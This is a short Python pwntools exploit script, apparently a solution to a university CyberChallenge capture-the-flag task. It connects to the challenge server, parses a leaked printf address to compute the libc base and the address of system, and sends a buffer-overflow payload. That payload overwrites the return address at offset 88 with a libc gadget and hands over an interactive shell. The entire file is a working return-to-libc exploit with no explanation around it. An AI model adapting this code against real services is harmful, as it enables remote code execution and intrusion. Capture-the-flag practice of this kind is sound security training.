from pwn import *

HOST = 'cyberchallenge.disi.unitn.it'
PORT = 9101
OFFSET = 88 #capire come arrivarci

#take a look for atol

libc = ELF('./libc.so.6')

p = remote(HOST, PORT)

system = libc.symbols['system'] 
printf = libc.symbols['printf']


p.recvuntil('In my libc, printf() is at ')
leaked_printf = int (p.recvuntil(', can you guess').strip().split(b',')[0],16)

libc_base = leaked_printf - printf
offset = system - printf
system_runtime = leaked_printf + offset

gadget = 0x583dc
gadget_address = libc_base + gadget
 
payload = f"{system_runtime}".encode()
payload += b'A'*(OFFSET - len(payload))
payload += p64(gadget_address)

p.sendline(payload)

p.interactive()
